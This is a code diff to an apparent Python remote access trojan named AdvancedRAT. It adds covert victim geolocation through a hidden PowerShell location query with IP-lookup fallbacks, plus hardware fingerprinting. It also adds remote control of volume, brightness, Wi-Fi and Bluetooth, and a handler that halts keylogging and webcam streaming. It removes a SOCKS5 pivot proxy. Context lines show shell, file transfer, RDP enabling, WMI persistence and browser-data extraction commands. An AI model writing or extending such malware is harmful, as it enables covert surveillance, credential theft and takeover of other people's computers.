@@ -929,12 +929,15 @@ class SystemProfiler:
             "pid": os.getpid(),
             "is_admin": PrivilegeManager.is_admin(),
             "boot_time": psutil.boot_time(),
+            "uptime": time.time() - psutil.boot_time(),
             "python_version": sys.version,
             "current_directory": os.getcwd(),
             "platform": platform.platform(),
             "mac_address": SystemProfiler.get_mac_address(),
             "public_ip": SystemProfiler.get_public_ip(),
-            "installed_packages": SystemProfiler.get_installed_packages()
+            "installed_packages": SystemProfiler.get_installed_packages(),
+            "gpu": SystemProfiler.get_gpu_info(),
+            "motherboard": SystemProfiler.get_motherboard_info()
         }
         
         # Get disk usage for all partitions
@@ -987,7 +990,8 @@ class SystemProfiler:
                 "memory_total": psutil.virtual_memory().total,
                 "disk_usage": psutil.disk_usage('/').percent,
                 "disk_total": psutil.disk_usage('/').total,
-                "network_connections": len(psutil.net_connections() if hasattr(psutil, 'net_connections') else [])
+                "network_connections": len(psutil.net_connections() if hasattr(psutil, 'net_connections') else []),
+                "uptime": time.time() - psutil.boot_time()
             }
         except:
             return {}
@@ -1080,103 +1084,137 @@ class SystemProfiler:
         except:
             return []
 
-class SocksProxy:
-    """Simple SOCKS5 Proxy Server for pivot"""
-    def __init__(self, host='0.0.0.0', port=1080):
-        self.host = host
-        self.port = port
-        self.running = False
-        self.server = None # type: socket.socket | None
-
-    def start(self):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    @staticmethod
+    def get_gpu_info():
+        """Get GPU information (Windows/Linux)"""
         try:
-            self.server.bind((self.host, self.port))
-            self.server.listen(5)
-            self.running = True
-            threading.Thread(target=self._accept_loop, daemon=True).start()
-            return True, f"SOCKS5 proxy started on {self.host}:{self.port}"
+            if IS_WINDOWS:
+                import subprocess
+                cmd = "wmic path win32_VideoController get name"
+                output = subprocess.check_output(cmd, shell=True, creationflags=0x08000000).decode().strip()
+                gpus = [line.strip() for line in output.split('\n')[1:] if line.strip()]
+                return ", ".join(gpus) if gpus else "Unknown"
+            elif IS_LINUX:
+                output = subprocess.check_output("lspci | grep -i vga", shell=True).decode().strip()
+                return output
+        except: pass
+        return "Unknown"
+
+    @staticmethod
+    def get_motherboard_info():
+        """Get motherboard information (Windows/Linux)"""
+        try:
+            if IS_WINDOWS:
+                import subprocess
+                cmd = "wmic baseboard get product,Manufacturer,version,serialnumber"
+                output = subprocess.check_output(cmd, shell=True, creationflags=0x08000000).decode().strip()
+                return output
+            elif IS_LINUX:
+                try:
+                    with open('/sys/class/dmi/id/board_name', 'r') as f:
+                        name = f.read().strip()
+                    with open('/sys/class/dmi/id/board_vendor', 'r') as f:
+                        vendor = f.read().strip()
+                    return f"{vendor} {name}"
+                except: pass
+        except: pass
+        return "Unknown"
+
+    @staticmethod
+    def get_geolocation():
+        """Get detailed, perfect geolocation using native OS location API, falling back to IP based geo"""
+        try:
+            import platform
+            from subprocess import run, PIPE
+            
+            # ATTEMPT NATIVE EXACT LOCATION FIRST (WINDOWS WI-FI/GPS SENSOR)
+            if platform.system() == 'Windows':
+                ps_script = '''
+$ErrorActionPreference = "Stop"
+Add-Type -AssemblyName System.Device
+$watcher = New-Object System.Device.Location.GeoCoordinateWatcher -ArgumentList 2 # High accuracy
+$watcher.Start()
+Start-Sleep -Milliseconds 2500
+if (-not $watcher.Position.Location.IsUnknown) {
+    $loc = $watcher.Position.Location
+    Write-Output "$($loc.Latitude),$($loc.Longitude)"
+} else {
+    Write-Output "UNKNOWN"
+}
+$watcher.Stop()
+'''
+                res = run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script], stdout=PIPE, stderr=PIPE, timeout=4, creationflags=0x08000000)
+                output = res.stdout.decode().strip()
+                if "UNKNOWN" not in output and "," in output:
+                    lat, lon = output.split(",")
+                    return {
+                        'lat': float(lat.strip()),
+                        'lon': float(lon.strip()),
+                        'source': 'Windows Native GPS/Wi-Fi Positioning (High Accuracy Exact Coordinates)',
+                        'ip': 'N/A',
+                        'country': 'N/A',
+                        'region': 'N/A',
+                        'city': 'N/A',
+                        'isp': 'N/A'
+                    }
+        except Exception:
+            pass
+
+        # FALLBACK TO IP-API (EXTENSIVE METADATA)
+        try:
+            import requests
+            headers = {'User-Agent': 'Mozilla/5.0'}
+            resp = requests.get("http://ip-api.com/json/?fields=61439", headers=headers, timeout=10)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get('status') == 'success':
+                    return {
+                        'ip': data.get('query', ''),
+                        'country': data.get('country', ''),
+                        'countryCode': data.get('countryCode', ''),
+                        'region': data.get('regionName', ''),
+                        'city': data.get('city', ''),
+                        'zip': data.get('zip', ''),
+                        'lat': float(data.get('lat', 0)),
+                        'lon': float(data.get('lon', 0)),
+                        'timezone': data.get('timezone', ''),
+                        'isp': data.get('isp', ''),
+                        'org': data.get('org', ''),
+                        'asn': data.get('as', ''),
+                        'is_mobile': bool(data.get('mobile', False)),
+                        'is_vpn_proxy': bool(data.get('proxy', False)),
+                        'is_hosting': bool(data.get('hosting', False)),
+                        'source': 'ip-api.com (IP Geolocation Estimate)'
+                    }
+        except Exception:
+            pass
+
+        try:
+            import urllib.request
+            import json
+            req = urllib.request.Request("https://ipapi.co/json/", headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=10) as url:
+                data = json.loads(url.read().decode())
+                return {
+                    'ip': data.get('ip', ''),
+                    'country': data.get('country_name', ''),
+                    'countryCode': data.get('country_code', ''),
+                    'region': data.get('region', ''),
+                    'city': data.get('city', ''),
+                    'zip': data.get('postal', ''),
+                    'lat': float(data.get('latitude', 0)),
+                    'lon': float(data.get('longitude', 0)),
+                    'timezone': data.get('timezone', ''),
+                    'isp': data.get('org', ''), 
+                    'org': data.get('org', ''),
+                    'asn': data.get('asn', ''),
+                    'is_mobile': False,
+                    'is_vpn_proxy': False,
+                    'is_hosting': False,
+                    'source': 'ipapi.co (IP Geolocation Estimate)'
+                }
         except Exception as e:
-            return False, str(e)
-
-    def stop(self):
-        self.running = False
-        if self.server:
-            self.server.close()
-        return True, "SOCKS5 proxy stopped"
-
-    def _accept_loop(self):
-        while self.running:
-            try:
-                client, addr = self.server.accept()
-                threading.Thread(target=self._handle_client, args=(client,), daemon=True).start()
-            except: pass
-
-    def _handle_client(self, client):
-        try:
-            # 1. Greeting
-            greeting = client.recv(2)
-            if not greeting or greeting[0] != 0x05:
-                client.close()
-                return
-            
-            # No auth
-            client.sendall(b"\x05\x00")
-            
-            # 2. Connection Request
-            data = client.recv(4)
-            if not data or data[1] != 0x01: # Connect
-                client.close()
-                return
-            
-            atyp = data[3]
-            if atyp == 0x01: # IPv4
-                target_addr = socket.inet_ntoa(client.recv(4))
-            elif atyp == 0x03: # Domain
-                addr_len = client.recv(1)[0]
-                target_addr = client.recv(addr_len).decode()
-            else:
-                client.close()
-                return
-                
-            target_port = int.from_bytes(client.recv(2), 'big')
-            
-            # 3. Connect to Target
-            try:
-                target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                target_sock.settimeout(10)
-                target_sock.connect((target_addr, target_port))
-                
-                # Success response
-                client.sendall(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
-                
-                # 4. Forwarding
-                def forward(src, dst):
-                    try:
-                        while self.running:
-                            data = src.recv(4096)
-                            if not data: break
-                            dst.sendall(data)
-                    except: pass
-                    finally:
-                        src.close()
-                        dst.close()
-                
-                threading.Thread(target=forward, args=(client, target_sock), daemon=True).start()
-                threading.Thread(target=forward, args=(target_sock, client), daemon=True).start()
-                
-            except Exception as e:
-                # Connection refused/error
-                client.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2, 'big'))
-                client.close()
-                
-        except:
-            client.close()
-
-class PersistenceManager:
-    """Handle persistence mechanisms for different platforms"""
-    
+            return {'error': 'Failed to resolve location'}
     @staticmethod
     def install_persistence():
         """Install persistence based on platform"""
@@ -1700,6 +1738,7 @@ class AdvancedRAT:
         return {
             'shell': self._handle_shell,
             'powershell': self._handle_powershell,
+            'cancel_command': self._handle_cancel_command,
             'download': self._handle_download,
             'upload': self._handle_upload,
             'write_file': self._handle_write_file,
@@ -1751,7 +1790,13 @@ class AdvancedRAT:
             'enable_rdp': self._handle_enable_rdp,
             'script': self._handle_script,
             'wmi': self._handle_wmi_persistence,
-            'browser_kill': self._handle_close_browser
+            'browser_kill': self._handle_close_browser,
+            'volume_control': self._handle_volume_control,
+            'monitor_control': self._handle_monitor_control,
+            'geolocation': self._handle_geolocation,
+            'brightness_control': self._handle_brightness_control,
+            'wifi_control': self._handle_wifi_control,
+            'bluetooth_control': self._handle_bluetooth_control
         }
     
     def _handle_script(self, cmd):
@@ -2179,16 +2224,54 @@ class AdvancedRAT:
                 if cmd_id in self.active_tasks:
                     cmd_info = self.active_tasks.get(cmd_id, {})
                     cmd_type = cmd_info.get('type')
-                    # If it was a background task, notify server it's done
-                    if cmd_type in ['shell', 'stream_start', 'webcam_stream', 'keylog', 'wlog']:
+                    # Only signal completion for non-background tasks locally
+                    if cmd_type not in ['shell', 'stream_start', 'stream', 'webcam_stream', 'keylog', 'wlog']:
                          self._send_encrypted({
                             'type': 'status_update',
                             'command_id': cmd_id,
                             'status': 'completed',
                             'is_active': 0
                         })
-                    del self.active_tasks[cmd_id]
                     
+                    if cmd_type not in ['stream_start', 'stream', 'webcam_stream', 'keylog', 'wlog']:
+                        del self.active_tasks[cmd_id]
+                    
+    def _handle_cancel_command(self, cmd):
+        """Cancel an active background task"""
+        target_id = cmd.get('target_id')
+        if not target_id:
+            return {'error': 'No target_id provided'}
+            
+        with self.active_lock:
+            # Broadcast stop to common background tasks
+            self._streaming = False
+            if hasattr(self, '_webcam_streaming'): self._webcam_streaming = False
+            if hasattr(self, 'keylog_running'): self._stop_background_keylogger()
+            if hasattr(self, 'wlog_running'): self.wlog_running = False
+            
+            if target_id in self.active_tasks:
+                del self.active_tasks[target_id]
+            
+            # Stop processes if tracking them
+            if hasattr(self, 'CommandExecutor') and hasattr(self.CommandExecutor, 'active_processes'):
+                if target_id in self.CommandExecutor.active_processes:
+                    try:
+                        proc = self.CommandExecutor.active_processes[target_id]
+                        proc.kill()
+                        del self.CommandExecutor.active_processes[target_id]
+                    except:
+                        pass
+            
+            # Send completion signal for the target
+            self._send_encrypted({
+                'type': 'status_update',
+                'command_id': target_id,
+                'status': 'cancelled',
+                'is_active': 0
+            })
+            
+        return {'success': True, 'message': f'Cancellation signal broadcasted for task {target_id}'}
+
     def _handle_chromelevator(self, cmd):
         """Use Chromelevator for advanced browser extraction"""
         if not IS_WINDOWS:
@@ -2485,20 +2568,113 @@ class AdvancedRAT:
             return {'error': str(e)}
 
     def _handle_volume_control(self, cmd):
-        """Get/Set system volume (Windows only for now)"""
-        if not IS_WINDOWS: return {'error': 'Volume control only supported on Windows'}
+        """Get/Set system volume (Cross-platform)"""
         action = cmd.get('action', 'get') # get, set, mute
         level = cmd.get('level', 50) # 0-100
         
         try:
-            # Simple volume control via PowerShell to avoid complex COM/pycaw
-            if action == 'set':
-                subprocess.run(['powershell', '-Command', f"$v = {level}/100; (new-object -com wscript.shell).SendKeys([char]175 * 50); (new-object -com wscript.shell).SendKeys([char]174 * (100 - {level}))"], creationflags=0x08000000)
+            if IS_WINDOWS:
+                if action == 'set':
+                    # Simplified volume control via SendKeys (Legacy but effective without deps)
+                    ps_cmd = f"$w = new-object -com wscript.shell; for($i=0; $i -lt 50; $i++) {{ $w.SendKeys([char]174) }}; for($i=0; $i -lt ({level}/2); $i++) {{ $w.SendKeys([char]175) }}"
+                    subprocess.run(['powershell', '-Command', ps_cmd], creationflags=0x08000000)
+                    return {'success': True, 'level': level}
+                elif action == 'mute':
+                    subprocess.run(['powershell', '-Command', "(new-object -com wscript.shell).SendKeys([char]173)"], creationflags=0x08000000)
+                    return {'success': True}
+                return {'error': 'Get volume not implemented on Windows without external libraries'}
+            elif IS_LINUX:
+                if action == 'set':
+                    subprocess.run(['amixer', '-D', 'pulse', 'sset', 'Master', f'{level}%'], capture_output=True)
+                    return {'success': True, 'level': level}
+                elif action == 'mute':
+                    subprocess.run(['amixer', '-D', 'pulse', 'sset', 'Master', 'toggle'], capture_output=True)
+                    return {'success': True}
+                elif action == 'get':
+                    res = subprocess.run("amixer get Master | grep -Po '[0-9]+(?=%)' | head -1", shell=True, capture_output=True, text=True)
+                    return {'volume': res.stdout.strip()}
+            return {'error': 'Platform not supported'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_geolocation(self, cmd):
+        """Get geolocation based on public IP"""
+        return SystemProfiler.get_geolocation()
+
+    def _handle_brightness_control(self, cmd):
+        """Get/Set monitor brightness"""
+        action = cmd.get('action', 'get') # get, set
+        level = cmd.get('level', 50) # 0-100
+        
+        try:
+            if IS_WINDOWS:
+                if action == 'set':
+                    ps_cmd = f"(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, {level})"
+                    subprocess.run(['powershell', '-Command', ps_cmd], creationflags=0x08000000, capture_output=True)
+                    return {'success': True, 'level': level}
+                else:
+                    ps_cmd = "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightness).CurrentBrightness"
+                    res = subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True, text=True, creationflags=0x08000000)
+                    return {'brightness': res.stdout.strip()}
+            elif IS_LINUX:
+                backlight_path = "/sys/class/backlight"
+                if os.path.exists(backlight_path):
+                    for ctrl in os.listdir(backlight_path):
+                        ctrl_path = os.path.join(backlight_path, ctrl)
+                        if action == 'set':
+                            try:
+                                max_br = int(open(os.path.join(ctrl_path, "max_brightness")).read().strip())
+                                target = int(max_br * (level / 100.0))
+                                subprocess.run(['bash', '-c', f"echo {target} > {os.path.join(ctrl_path, 'brightness')}"], capture_output=True)
+                            except: continue
+                        else:
+                            curr = int(open(os.path.join(ctrl_path, "brightness")).read().strip())
+                            max_br = int(open(os.path.join(ctrl_path, "max_brightness")).read().strip())
+                            return {'brightness': int((curr / max_br) * 100)}
+                    return {'success': True} if action == 'set' else {'error': 'Could not read brightness'}
+            return {'error': 'Platform not supported'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_wifi_control(self, cmd):
+        """WiFi Management"""
+        action = cmd.get('action', 'scan')
+        try:
+            if IS_WINDOWS:
+                if action == 'on':
+                    subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'enabled'], creationflags=0x08000000)
+                elif action == 'off':
+                    subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'disabled'], creationflags=0x08000000)
+                elif action == 'scan':
+                    res = subprocess.run(['netsh', 'wlan', 'show', 'networks'], capture_output=True, text=True, creationflags=0x08000000)
+                    return {'networks': res.stdout}
                 return {'success': True}
-            elif action == 'mute':
-                subprocess.run(['powershell', '-Command', "(new-object -com wscript.shell).SendKeys([char]173)"], creationflags=0x08000000)
+            elif IS_LINUX:
+                if action == 'on':
+                    subprocess.run(['nmcli', 'radio', 'wifi', 'on'])
+                elif action == 'off':
+                    subprocess.run(['nmcli', 'radio', 'wifi', 'off'])
+                elif action == 'scan':
+                    res = subprocess.run(['nmcli', '-t', '-f', 'SSID,SIGNAL', 'dev', 'wifi'], capture_output=True, text=True)
+                    return {'networks': res.stdout}
                 return {'success': True}
-            return {'error': 'Get volume not implemented via this method'}
+            return {'error': 'Platform not supported'}
+        except Exception as e:
+            return {'error': str(e)}
+
+    def _handle_bluetooth_control(self, cmd):
+        """Bluetooth Management"""
+        action = cmd.get('action', 'on')
+        try:
+            if IS_WINDOWS:
+                state = "Running" if action == "on" else "Stopped"
+                subprocess.run(['powershell', '-Command', f"Set-Service -Name bthserv -Status {state}"], creationflags=0x08000000)
+                return {'success': True}
+            elif IS_LINUX:
+                state = "on" if action == "on" else "off"
+                subprocess.run(['bluetoothctl', 'power', state], capture_output=True)
+                return {'success': True}
+            return {'error': 'Platform not supported'}
         except Exception as e:
             return {'error': str(e)}
 
